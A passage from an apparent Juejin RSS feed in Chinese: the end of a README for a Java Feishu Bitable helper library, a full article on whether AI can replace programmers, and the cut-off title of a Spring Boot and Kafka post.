<span class="hljs-type">DeleteRecordRes</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> FsDwRecordHelper.deleteRecord(del);
</code></pre>
<h2 data-id="heading-24">条件查询</h2>
<pre><code class="hljs language-java" lang="java">DwLambdaQueryWrapper&lt;TestTable&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DwLambdaQueryWrapper</span>&lt;&gt;();
wrapper.eq(TestTable::getName, <span class="hljs-string">"Alice"</span>);
List&lt;TestTable&gt; list = FsDwRecordHelper.queryRecords(TestTable.class, wrapper);

wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DwLambdaQueryWrapper</span>&lt;&gt;();
wrapper.between(TestTable::getAge, <span class="hljs-number">18</span>, <span class="hljs-number">30</span>);
list = FsDwRecordHelper.queryRecords(TestTable.class, wrapper);

wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DwLambdaQueryWrapper</span>&lt;&gt;();
wrapper.pageSize(<span class="hljs-number">20</span>);
wrapper.pageNo(<span class="hljs-number">2</span>);
list = FsDwRecordHelper.queryRecords(TestTable.class, wrapper);
</code></pre>
<h2 data-id="heading-25">数据表操作</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">CreateTableRes</span> <span class="hljs-variable">created</span> <span class="hljs-operator">=</span> FsDwTableHelper.createTable(TestTable.class);
List&lt;ListTableRes.TableItem&gt; all = FsDwTableHelper.listAllTables(TestTable.class);
<span class="hljs-type">UpdateTableRes</span> <span class="hljs-variable">updated</span> <span class="hljs-operator">=</span> FsDwTableHelper.updateTable(TestTable.class);
<span class="hljs-type">DeleteTableRes</span> <span class="hljs-variable">deleted</span> <span class="hljs-operator">=</span> FsDwTableHelper.deleteTable(TestTable.class);
</code></pre>
<h2 data-id="heading-26">字段操作</h2>
<pre><code class="hljs language-java" lang="java">List&lt;TableFieldListRes.TableField&gt; fields = FsDwFieldHelper.listFields(<span class="hljs-string">"tblxxxxx"</span>, <span class="hljs-string">"vewxxxxx"</span>);
<span class="hljs-type">AddFieldRes</span> <span class="hljs-variable">created</span> <span class="hljs-operator">=</span> FsDwFieldHelper.createField(TestTable.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AddFieldReq</span>(<span class="hljs-string">"New Field"</span>, TypeEnum.TEXT));
<span class="hljs-type">UpdateFieldRes</span> <span class="hljs-variable">updated</span> <span class="hljs-operator">=</span> FsDwFieldHelper.updateFieldByName(TestTable.class, <span class="hljs-string">"New Field"</span>,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateFieldReq</span>(<span class="hljs-string">"New Field Name"</span>, TypeEnum.TEXT));
<span class="hljs-type">DeleteFieldRes</span> <span class="hljs-variable">deleted</span> <span class="hljs-operator">=</span> FsDwFieldHelper.deleteFieldByName(TestTable.class, <span class="hljs-string">"New Field Name"</span>);
</code></pre>
<h2 data-id="heading-27">直接使用 Service Bean</h2>
<p>如果希望使用 Spring 管理的 Service：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoService</span> {
  <span class="hljs-meta">@Autowired</span>
  <span class="hljs-keyword">private</span> FsDwRecordService recordService;

  <span class="hljs-keyword">public</span> QueryRecordRes <span class="hljs-title function_">query</span><span class="hljs-params">(String appId, String appSecret, String appToken, String tableId, QueryRecordReq req)</span> {
    <span class="hljs-keyword">return</span> recordService.queryRecord(appId, appSecret, appToken, tableId, req);
  }
}
</code></pre>
<h2 data-id="heading-28">异常与错误码</h2>
<p>所有 Helper/Service 方法在失败时会抛出 <code>BitableException</code>。
错误码与信息请参考 <code>BitableErrorCode</code>。</p>
<h2 data-id="heading-29">注意事项</h2>
<h3 data-id="heading-30">1. 分页查询的性能限制</h3>
<p>飞书多维表格的分页机制与传统的数据库分页（如 MySQL 的 OFFSET）不同：</p>
<ul>
<li><strong>顺序分页</strong>：飞书使用 <code>page_token</code> 机制，必须从第一页开始顺序获取</li>
<li><strong>性能影响</strong>：查询第 N 页需要发起 N 次请求，对于大结果集会有性能问题</li>
<li><strong>建议</strong>：
<ul>
<li>尽量使用查询条件缩小结果集范围</li>
<li>避免跳转到很深的页码（如直接查第 1000 页）</li>
<li>如果需要大数据量处理，考虑使用全量导出或其他方式</li>
</ul>
</li>
</ul>
<h3 data-id="heading-31">2. 双 API 设计说明</h3>
<p>本项目提供了两种使用方式：</p>
<p><strong>静态 Helper API</strong>：</p>
<pre><code class="hljs language-java" lang="java">FsDwRecordHelper.queryRecords(TestTable.class);
</code></pre>
<ul>
<li>优点：简洁便捷，无需注入</li>
<li>缺点：静态方法难以 mock，不利于单元测试</li>
</ul>
<p><strong>Service Bean API</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> FsDwRecordService recordService;
</code></pre>
<ul>
<li>优点：可测试、可 AOP 拦截、支持多租户</li>
<li>缺点：需要显式注入</li>
</ul>
<p><strong>建议</strong>：简单项目用 Helper，复杂项目或多租户场景用 Service。</p>
<h3 data-id="heading-32">3. 与现有 Forest 项目的集成</h3>
<p>如果你的项目已经使用了 Forest 并自定义了 <code>@ForestScan</code>，需要确保将本项目的 API 包加入扫描路径：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ForestScan(basePackages = {
    "your.project.forest.clients",
    "cn.bdmcom.core.api"  // 必须包含
})</span>
</code></pre>
<h3 data-id="heading-33">4. Lambda 查询的性能考虑</h3>
<p><code>DwLambdaQueryWrapper</code> 使用反射解析 Lambda 表达式获取字段名：</p>
<ul>
<li>首次解析会有性能开销，字段名映射会被缓存</li>
<li>频繁创建新的 Wrapper 实例会有一定开销</li>
<li>建议复用 Wrapper 实例或使用字符串字段名</li>
</ul>
<h3 data-id="heading-34">5. Token 缓存管理</h3>
<p>Token 默认缓存 2 小时（提前 60 秒刷新），如需手动清除：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> FsDwTokenService tokenService;

<span class="hljs-comment">// 清除指定 token</span>
tokenService.evictToken(appId, appSecret);

<span class="hljs-comment">// 清除所有 token</span>
tokenService.evictAll();

<span class="hljs-comment">// 获取缓存统计</span>
<span class="hljs-type">CacheStats</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> tokenService.getCacheStats();
</code></pre>
<h3 data-id="heading-35">6. 类型转换限制</h3>
<p>飞书多维表格的字段类型与 Java 类型映射有限制：</p>
<ul>
<li>日期时间：自动转换为 <code>LocalDateTime</code>/<code>LocalDate</code></li>
<li>多选/单选：返回文本内容或数组</li>
<li>复杂嵌套结构可能需要手动处理</li>
</ul>
<h2 data-id="heading-36">发布到 Maven Central</h2>
<p>发布前请更新 <code>pom.xml</code> 元信息：</p>
<ul>
<li><code>url</code>、<code>scm</code>、<code>developers</code></li>
<li><code>groupId</code> 所有权与发布版本号</li>
</ul>
<p>签名构建：</p>
<pre><code class="hljs language-sh" lang="sh">mvn -P release -DskipTests clean verify
</code></pre>
<p>发布需要配置 Sonatype 账号与 GPG 密钥，请根据官方流程完成发布。</p>
<h2 data-id="heading-37">许可证</h2>
<p>Apache License, Version 2.0</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 是否真的能完全替代程序员？从我试用 AI 开发到前后端架构与页面开发的真实分析]]></title>    <link>https://juejin.cn/post/7589099845186338852</link>    <guid>https://juejin.cn/post/7589099845186338852</guid>    <pubDate>2025-12-29T09:49:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589099845186338852" data-draft-id="7589201772117606406" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 是否真的能完全替代程序员？从我试用 AI 开发到前后端架构与页面开发的真实分析"/> <meta itemprop="keywords" content="后端,AI编程"/> <meta itemprop="datePublished" content="2025-12-29T09:49:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="挖土机_008"/> <meta itemprop="url" content="https://juejin.cn/user/4373178080835884"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 是否真的能完全替代程序员？从我试用 AI 开发到前后端架构与页面开发的真实分析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4373178080835884/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    挖土机_008
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:49:23.000Z" title="Mon Dec 29 2025 09:49:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    16
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作为一名正在试用 AI 进行开发的程序员，我最近尝试让 AI 辅助我完成<strong>前端页面、后端服务和系统逻辑的开发</strong>。在这个过程中，我深刻体会到 AI 的强大，也感受到了它的局限。本文从我的实践出发，结合信息安全、系统架构、后期维护性以及前后端开发场景，对 AI 替代程序员的可能性进行全面分析。</p>
<hr/>
<p>文章地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhiliaole.top%2Farchives%2F1766999092078" target="_blank" title="https://zhiliaole.top/archives/1766999092078" ref="nofollow noopener noreferrer">zhiliaole.top/archives/17…</a></p>
<p>更多文章：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhiliaole.top" target="_blank" title="https://zhiliaole.top" ref="nofollow noopener noreferrer">zhiliaole.top</a></p>
<h2 data-id="heading-0">一、AI 带来的效率提升</h2>
<p>在日常开发中，我发现 AI 对一些重复性和机械性任务非常高效：</p>
<ul>
<li><strong>前端页面模板</strong>：React/Vue 组件快速生成</li>
<li><strong>表单校验逻辑</strong>：常规验证规则可以直接生成</li>
<li><strong>简单 CRUD 接口</strong>：后端 Controller/Service 代码快速落地</li>
<li><strong>单元测试和文档</strong>：AI 可以生成基础测试和文档模板</li>
</ul>
<p><strong>示例：前端表单组件</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">LoginForm</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [username, setUsername] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> [password, setPassword] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params">e</span>) =&gt; {
    e.<span class="hljs-title function_">preventDefault</span>();
    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/login'</span>, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ username, password })
    });
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">{handleSubmit}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{username}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{e</span> =&gt;</span> setUsername(e.target.value)} /&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{password}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{e</span> =&gt;</span> setPassword(e.target.value)} /&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  );
}
</code></pre>
<p>AI 可以在几秒钟内生成可运行的组件，大幅节省开发时间。</p>
<hr/>
<h2 data-id="heading-1">二、信息安全性：前后端不同场景的隐忧</h2>
<p>在实践中，我发现 AI 带来的效率背后，也隐藏着信息安全风险：</p>
<h3 data-id="heading-2">1. 前端页面开发风险</h3>
<ul>
<li><strong>敏感数据泄露</strong>：用户表单信息（身份证、支付信息）被直接输入 AI 提示，可能上传云端</li>
<li><strong>API Key/Token 泄露</strong>：AI 生成的示例代码可能直接包含凭证</li>
</ul>
<p><strong>示例风险代码：</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">fetch</span>(<span class="hljs-string">'https://api.payment.com/charge?token=AI_GENERATED_KEY'</span>, {...});
</code></pre>
<ul>
<li>如果直接使用 AI 提示生成代码，可能导致敏感信息泄露。</li>
</ul>
<h3 data-id="heading-3">2. 后端服务风险</h3>
<ul>
<li><strong>核心业务逻辑外泄</strong>：风控规则、支付策略被 AI 处理或存储</li>
<li><strong>依赖漏洞引入</strong>：AI 可能直接使用示例库或过时依赖</li>
</ul>
<p><strong>示意流程图：</strong></p>
<pre><code class="hljs language-css" lang="css">flowchart LR
FE<span class="hljs-selector-attr">[前端页面]</span> --&gt; BE<span class="hljs-selector-attr">[后端服务]</span>
BE --&gt; DB<span class="hljs-selector-attr">[(数据库)]</span>
FE --&gt; AI<span class="hljs-selector-attr">[AI生成前后端代码]</span>
AI --&gt; Cloud<span class="hljs-selector-attr">[云端日志存储]</span>
Cloud --&gt; Leak<span class="hljs-selector-attr">[潜在信息泄露风险]</span>
</code></pre>
<hr/>
<h2 data-id="heading-4">三、系统架构风险</h2>
<p>在试用 AI 开发过程中，我注意到 AI 生成的代码多关注局部功能，缺乏系统级思考：</p>
<h3 data-id="heading-5">1. 前端页面风险</h3>
<ul>
<li><strong>组件耦合严重</strong>：多个逻辑混在一个组件</li>
<li><strong>状态管理混乱</strong>：跨组件共享状态处理不合理</li>
<li><strong>样式风格不统一</strong>：影响用户体验</li>
</ul>
<p><strong>示例：Dashboard 页面</strong></p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">Dashboard</span>() {
  const <span class="hljs-selector-attr">[user, setUser]</span> = <span class="hljs-built_in">useState</span>(null);
  <span class="hljs-built_in">fetch</span>('/api/user')<span class="hljs-selector-class">.then</span>(res =&gt; res.json())<span class="hljs-selector-class">.then</span>(data =&gt; setUser(data));

  <span class="hljs-built_in">renderChart</span>(user.stats); <span class="hljs-comment">// AI直接嵌入图表逻辑</span>

  return &lt;<span class="hljs-selector-tag">div</span>&gt;{user<span class="hljs-selector-class">.name</span>}&lt;/<span class="hljs-selector-tag">div</span>&gt;;
}
</code></pre>
<ul>
<li>数据请求和图表渲染混在同一组件，违背单一职责原则。</li>
</ul>
<h3 data-id="heading-6">2. 后端服务风险</h3>
<ul>
<li><strong>Controller 层直接包含业务逻辑</strong></li>
<li><strong>跨模块调用</strong>：AI 可能破坏微服务边界</li>
<li><strong>缺少事务和异常控制</strong></li>
</ul>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@PostMapping</span>(<span class="hljs-string">"/create"</span>)
public OrderResponse <span class="hljs-built_in">create</span>(<span class="hljs-variable">@RequestBody</span> OrderReq req) {
    <span class="hljs-selector-tag">orderService</span><span class="hljs-selector-class">.createAndNotify</span>(req); <span class="hljs-comment">// AI生成</span>
    <span class="hljs-selector-tag">paymentService</span><span class="hljs-selector-class">.processPayment</span>(req); <span class="hljs-comment">// AI生成</span>
    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">OrderResponse</span>();
}
</code></pre>
<ul>
<li>Controller 同时处理订单和支付，架构腐化风险明显。</li>
</ul>
<hr/>
<h2 data-id="heading-7">四、后期维护性</h2>
<p>AI 生成代码虽然可运行，但<strong>长期维护问题突出</strong>：</p>
<h3 data-id="heading-8">前端页面</h3>
<ul>
<li>状态管理膨胀，跨组件状态难维护</li>
<li>样式与组件风格不统一</li>
<li>依赖库升级可能引发兼容问题</li>
</ul>
<h3 data-id="heading-9">后端服务</h3>
<ul>
<li>分支逻辑膨胀，新增业务类型修改成本高</li>
<li>缺少设计意图和上下文</li>
<li>技术债累积，长期重构成本高</li>
</ul>
<p><strong>维护流程示意图</strong>：</p>
<pre><code class="hljs language-css" lang="css">flowchart <span class="hljs-selector-tag">TD</span>
AI<span class="hljs-selector-attr">[生成代码]</span> --&gt; Review<span class="hljs-selector-attr">[人工审查]</span>
Review --&gt; Repo<span class="hljs-selector-attr">[提交仓库]</span>
Repo --&gt; CI<span class="hljs-selector-attr">[自动化测试]</span>
CI --&gt; Deploy<span class="hljs-selector-attr">[上线]</span>
Deploy --&gt; Maintenance<span class="hljs-selector-attr">[后期维护]</span>
Maintenance --&gt; Complexity<span class="hljs-selector-attr">[理解成本增加]</span>
</code></pre>
<hr/>
<h2 data-id="heading-10">五、前端页面开发可替代性分析</h2>
<p>在我的实践中，AI 对前端页面开发的替代性表现如下：</p>



































<table><thead><tr><th>前端任务</th><th>AI 可替代性</th><th>风险/限制</th></tr></thead><tbody><tr><td>页面模板生成</td><td>高</td><td>需人工审查布局是否符合设计规范</td></tr><tr><td>组件基础逻辑</td><td>中</td><td>复杂交互和状态管理可能出错</td></tr><tr><td>状态管理</td><td>低</td><td>跨组件状态难以维护</td></tr><tr><td>样式与 UX</td><td>低</td><td>风格不一致，用户体验不保证</td></tr><tr><td>API 调用与安全</td><td>中</td><td>需人工检查敏感信息</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-11">六、后端服务开发可替代性分析</h2>






























<table><thead><tr><th>后端任务</th><th>AI 可替代性</th><th>风险/限制</th></tr></thead><tbody><tr><td>简单 CRUD</td><td>高</td><td>需人工审查 SQL 安全性</td></tr><tr><td>核心业务逻辑</td><td>低</td><td>AI 无法理解业务策略</td></tr><tr><td>微服务架构</td><td>低</td><td>可能破坏模块边界</td></tr><tr><td>异常/事务处理</td><td>低</td><td>维护成本高</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-12">七、真实案例</h2>
<h3 data-id="heading-13">前端案例</h3>
<ul>
<li>我使用 AI 生成一个电商 Dashboard 页面</li>
<li>初期运行正常</li>
<li>随着业务复杂度增加，组件耦合严重，状态管理混乱</li>
<li>维护成本快速上升</li>
</ul>
<h3 data-id="heading-14">后端案例</h3>
<ul>
<li>我用 AI 生成支付模块和订单处理逻辑</li>
<li>初期功能完整，但缺乏事务控制和异常处理</li>
<li>系统架构受损，线上问题难以追责</li>
</ul>
<hr/>
<h2 data-id="heading-15">八、团队与职业能力影响</h2>
<p>在试用 AI 开发过程中，我发现：</p>
<ul>
<li>我的角色从“代码实现者”转向“AI 协作者、设计者、业务理解者”</li>
<li>技能需求从编码能力转向系统架构能力、业务理解和技术决策</li>
<li>AI 无法替代团队沟通、需求理解和跨部门协作</li>
</ul>
<p><strong>人机协作示意图</strong>：</p>
<pre><code class="hljs language-css" lang="css">flowchart LR
Dev<span class="hljs-selector-attr">[我/程序员]</span> --&gt; Prompt<span class="hljs-selector-attr">[AI提示输入]</span>
Prompt --&gt; AI<span class="hljs-selector-attr">[生成前后端代码/页面]</span>
AI --&gt; Review<span class="hljs-selector-attr">[人工审查]</span>
Review --&gt; Repo<span class="hljs-selector-attr">[提交仓库]</span>
Repo --&gt; CI<span class="hljs-selector-attr">[自动化测试]</span>
CI --&gt; Deploy<span class="hljs-selector-attr">[上线]</span>
</code></pre>
<hr/>
<h2 data-id="heading-16">九、综合分析</h2>















































<table><thead><tr><th>维度</th><th>前端页面</th><th>后端服务</th><th>替代可能性</th><th>风险与限制</th></tr></thead><tbody><tr><td>信息安全性</td><td>用户隐私、API Key</td><td>数据库、业务规则</td><td>低</td><td>敏感信息泄露</td></tr><tr><td>系统架构</td><td>组件耦合、状态管理</td><td>微服务边界、事务</td><td>极低</td><td>架构腐化、难扩展</td></tr><tr><td>后期维护性</td><td>样式、状态、依赖</td><td>分支逻辑、上下文</td><td>低</td><td>技术债累积</td></tr><tr><td>业务理解</td><td>用户体验、交互</td><td>核心业务、支付、风控</td><td>极低</td><td>无法替代人类决策</td></tr><tr><td>团队协作</td><td>需求沟通、UI/UX评审</td><td>技术决策、跨部门</td><td>极低</td><td>AI无法替代</td></tr></tbody></table>
<blockquote>
<p>我的实践结论：AI 可以替代部分重复性任务，但<strong>无法完全替代程序员</strong>，尤其在复杂前端页面和后端服务中。</p>
</blockquote>
<hr/>
<h2 data-id="heading-17">十、最佳实践（从我试用经验出发）</h2>
<ol>
<li><strong>明确 AI 边界</strong>：重复任务由 AI 完成，核心逻辑由人负责</li>
<li><strong>安全优先</strong>：敏感信息和业务规则使用企业私有模型</li>
<li><strong>严格审查</strong>：AI 输出代码必须人工审查</li>
<li><strong>文档与设计记录</strong>：保留决策记录，降低维护成本</li>
<li><strong>技能提升</strong>：程序员应专注架构设计、业务理解、技术决策和团队协作</li>
</ol>
<hr/>
<h2 data-id="heading-18">十一、结语</h2>
<p>通过试用 AI 开发，我切身体会到：</p>
<ul>
<li>AI 提高了开发效率，但无法替代核心能力</li>
<li>AI 可以生成前端页面和后端服务，但长期架构和维护仍需程序员</li>
<li>未来，程序员的核心角色将转向“系统设计者、业务理解者、AI 协作专家”</li>
</ul>
<blockquote>
<p>AI 是助力，而不是替代，它重塑了我的开发方式，也让我对程序员的核心价值有了更清晰的认识。</p>
</blockquote>
<p>文章地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhiliaole.top%2Farchives%2F1766999092078" target="_blank" title="https://zhiliaole.top/archives/1766999092078" ref="nofollow noopener noreferrer">zhiliaole.top/archives/17…</a></p>
<p>更多文章：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhiliaole.top" target="_blank" title="https://zhiliaole.top" ref="nofollow noopener noreferrer">zhiliaole.top</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Springboot整合kafka(MQ)]]></title>    <link>https://juejin.cn/post/7588411503120793636</link>    <guid>https://juejin.cn/post/7588411503120793636</guid>    <pubDate>2025-12-28T13:46:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588411503120793636" data-draft-id="7588411503120777252" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Springboot整合kafka(MQ)"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-28T13:46:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ihgry"/> <meta itemprop="url" content="https://juejin.cn/user/3210229685954718"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Springboot整合kafka(MQ)
